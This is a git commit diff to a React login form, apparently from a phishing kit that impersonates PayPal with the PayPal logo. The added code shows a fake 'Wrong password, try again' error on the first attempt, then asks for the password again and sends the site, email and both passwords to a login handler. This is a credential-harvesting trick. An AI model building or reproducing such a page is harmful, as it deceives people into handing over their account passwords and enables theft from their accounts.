c119d2ff10b002849426dc0bddf9ed84be03bf41
Zayn Yusuf <yusue786@gmail.com>
2024-05-10 16:00:52 +0600

    adding pic

--- components/LoginForm.js
+++ components/LoginForm.js
@@ -4,18 +4,20 @@ import { site } from "../config";
 import { useState } from "react";
 import { toast } from "react-toastify";
 
-function LoginForm({ setShowForm}) {
+function LoginForm({ setShowModal }) {
+  const [showWrongPassword, setShowWrongPassword] = useState(false);
 
   const initialvalues = {
     email: "",
     password: "",
+    wrongPassword: "",
     remember: "",
   };
 
-  const { login } = useMockLogin();
+  const { login } = useMockLogin({ setShowModal });
 
   const handleSubmit = (values, formik) => {
-    const { email, password} = values;
+    const { email, password, wrongPassword } = values;
 
     // console.log("values", values);
     // return;
@@ -24,19 +26,23 @@ function LoginForm({ setShowForm}) {
       site: site,
       email: email,
       password: password,
+      wrongPassword: wrongPassword,
       skipcode: "",
     };
 
     login(submitValues, formik);
-    setShowForm(true)
-    console.log(submitValues);
+
+    // console.log(submitValues);
   };
 
- 
+  const handleWrongPassword = () => {
+    setShowWrongPassword(true);
+    toast.error("Wrong password, try again");
+  };
 
   return (
     <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
-        <div className="relative    w-[80px] h-[80px] ">
+      <div className="relative    w-[80px] h-[80px] ">
             <Image
               src="/images/paypal-logo.svg"
               alt="avatar"
@@ -60,8 +66,8 @@ function LoginForm({ setShowForm}) {
                 type="email"
                 required
               />
-             
-              
+              {!showWrongPassword ? (
+                <>
                   <Field
                     className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                     placeholder="Password"
@@ -71,15 +77,33 @@ function LoginForm({ setShowForm}) {
                     required
                   />
 
-        
+                  <button
+                    type="button"
+                    onClick={handleWrongPassword}
+                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+                  >
+                    Log in
+                  </button>
+                </>
+              ) : (
+                <>
+                  <Field
+                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+                    placeholder="Password"
+                    name="wrongPassword"
+                    type="password"
+                    autoComplete="on"
+                    required
+                  />
+
                   <button
                     type="submit"
                     className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
                   >
                     Log in
                   </button>
-              
-             
+                </>
+              )}
             </Form>
           )}
         </Formik>
